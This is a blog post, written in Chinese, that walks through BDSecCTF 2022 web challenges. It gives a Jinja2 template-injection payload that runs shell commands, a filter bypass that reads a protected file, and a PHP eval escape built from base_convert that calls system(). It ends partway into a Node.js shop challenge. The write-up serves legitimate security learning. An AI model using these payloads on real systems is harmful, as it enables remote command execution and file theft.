<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
     <link rel="shortcut icon" href= /img/favicon.ico >
    <title>
        Sk1y&#39;s Blog
    </title>
    <meta name="description" content= Sk1y's blog >
    <meta name="keywords" content= Blog,Hexo,Theme,coder,Sk1y >
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">


<meta name="generator" content="Hexo 6.2.0"></head>
<body id="bodyx">
    <div class="hd posts">

    <a href="/index.html"><i class="fa fa-home
 replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            BDSecCTF2022-Web
        </p>
        <hr>
    </div>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BDSecCTF2022-Web"><span class="toc-text">BDSecCTF2022-Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jungle-Templating"><span class="toc-text">Jungle Templating</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Awesome-Note-Keeping"><span class="toc-text">Awesome Note Keeping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Awesome-Calculator"><span class="toc-text">Awesome Calculator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Knight-Squad-Shop"><span class="toc-text">Knight Squad Shop</span></a></li></ol></li></ol>
    <div class="post-content">
        <h1 id="BDSecCTF2022-Web"><a href="#BDSecCTF2022-Web" class="headerlink" title="BDSecCTF2022-Web"></a>BDSecCTF2022-Web</h1><p>[toc]</p>
<h2 id="Jungle-Templating"><a href="#Jungle-Templating" class="headerlink" title="Jungle Templating"></a>Jungle Templating</h2><p>模板注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720232832016.png" alt="image-20220720232832016"></p>
<p>自动化脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233225401.png" alt="image-20220720233225401"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233256890.png" alt="image-20220720233256890"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;Y3Y_7H1515_7H3_F146&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Awesome-Note-Keeping"><a href="#Awesome-Note-Keeping" class="headerlink" title="Awesome Note Keeping"></a>Awesome Note Keeping</h2><p>源码泄露index.php.bak</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234924808.png" alt="image-20220720234924808"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Awesome Note Keeping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;padding: 100px; background: #000000; color: #09b576&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to Awesome Note Keeping&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span>		</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;		<span class="comment">//这里是写入的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;All fields are required.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]) &gt;= <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note title is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]);	<span class="comment">//替换flag</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$note_title</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>)) &#123;	<span class="comment">//如果存在，就把其展示出来</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;There is already a note with that title and the note is &lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$note_title</span>);</span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;	<span class="comment">//如果不存在，就写入进去</span></span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myNote</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Your note has been saved.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Sorry ! You can&#x27;t create flag note.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] != <span class="string">&quot;flag&quot;</span>) &#123;		<span class="comment">//这里是读取信息的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry ! Couldn&#x27;t find any note with that title.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意在写入的时候，会对<code>$note_title</code>进行两次替换，将flag替换为空，所以整两次嵌套</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flaflflagagg</span><br></pre></td></tr></table></figure>

<p>并且第一次要创建一下<code>$note_title=flaflflagagg</code>，然后第二次的时候，满足第25行的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>然后才会替换flag为空，读取flag.txt</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234906221.png" alt="image-20220720234906221"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;tHe_n0t3_K33p1n6_4W350M3_N5&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Awesome-Calculator"><a href="#Awesome-Calculator" class="headerlink" title="Awesome Calculator"></a>Awesome Calculator</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span>(<span class="params"><span class="variable">$query</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([a-z_]+)/&quot;</span>, <span class="variable">$query</span>, <span class="variable">$words</span>);</span><br><span class="line">    <span class="variable">$words</span> = <span class="variable">$words</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$good</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>, <span class="string">&#x27;ncr&#x27;</span>, <span class="string">&#x27;npr&#x27;</span>, <span class="string">&#x27;number_format&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>];</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789.!^&amp;|+-*/%()[],_&#x27;</span>;</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$accept_chars</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$words</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$words</span>[<span class="variable">$i</span>]) &amp;&amp; <span class="title function_ invoke__">array_search</span>(<span class="variable">$words</span>[<span class="variable">$i</span>], <span class="variable">$good</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$words</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$query</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="variable">$query</span>[<span class="variable">$i</span>], <span class="variable">$accept_chars</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$query</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$illegal</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_calculations</span>(<span class="params"><span class="variable">$argument</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$argument</span>) &gt; <span class="number">1030</span>) <span class="keyword">return</span> <span class="string">&quot;Calculation too long.&quot;</span>;</span><br><span class="line">    <span class="variable">$argument</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="title function_ invoke__">filtering</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$illegal</span>)))</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;Oh my god ! What is this: &quot;</span> . <span class="variable">$illegal</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span> . <span class="variable">$argument</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]) &amp;&amp; <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My Awesome Calculator&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;margin: 50px;&quot;</span>&gt;</span><br><span class="line">    &lt;h1&gt;My Awesome Calculator&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input placeholder=<span class="string">&quot;Surprise me with calculations&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;calculation&quot;</span> value=<span class="string">&quot;&lt;?= <span class="subst">$_GET</span>[&#x27;calculation&#x27;] ?? &#x27;&#x27; ?&gt;&quot;</span> style=<span class="string">&quot;padding: 150px; font-size: 40px;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;div style=<span class="string">&quot;font-size: 40px;&quot;</span>&gt;</span><br><span class="line">                Result : <span class="meta">&lt;?=</span> @<span class="title function_ invoke__">do_calculations</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">    &lt;a href=<span class="string">&quot;?source&quot;</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>原题</p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/25765">CTFtime.org &#x2F; BambooFox CTF 2021 &#x2F; Calc.exe Online &#x2F; Writeup</a></p>
<p>cat &#x2F;etc&#x2F;passwd</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189751590363</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189803607951</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">428637964</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure>

<p>其中对应关系</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>) system</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) hex2bin</span><br></pre></td></tr></table></figure>

<p>在原有的wp上进行修改，将&#x2F;ect&#x2F;passwd替换为<code>*</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)));   <span class="comment">//*</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;*&quot;</span>),<span class="number">36</span>,<span class="number">10</span>));</span><br></pre></td></tr></table></figure>

<p>最后的payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure>





<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721002946630.png" alt="image-20220721002946630"></p>
<h2 id="Knight-Squad-Shop"><a href="#Knight-Squad-Shop" class="headerlink" title="Knight Squad Shop"></a>Knight Squad Shop</h2><p>给了附件</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721110744901.png" alt="image-20220721110744901"></p>
<p>主界面</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721004053128.png" alt="image-20220721004053128"></p>
<p>源码中主要是三个路由</p>
<ol>
<li>&#x2F;api&#x2F;v1&#x2F;sell</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/sell&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;flags&#x27;</span> &amp;&amp; !req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!products[key]) &#123;</span><br><span class="line">            products[key] = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product));        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> [k, v] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k === <span class="string">&#x27;quantity&#x27;</span>) &#123;</span><br><span class="line">                products[key][k] += v;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                products[key][k] = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Sell successful&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>&#x2F;api&#x2F;v1&#x2F;buy 购买相关产品</li>
</ol>
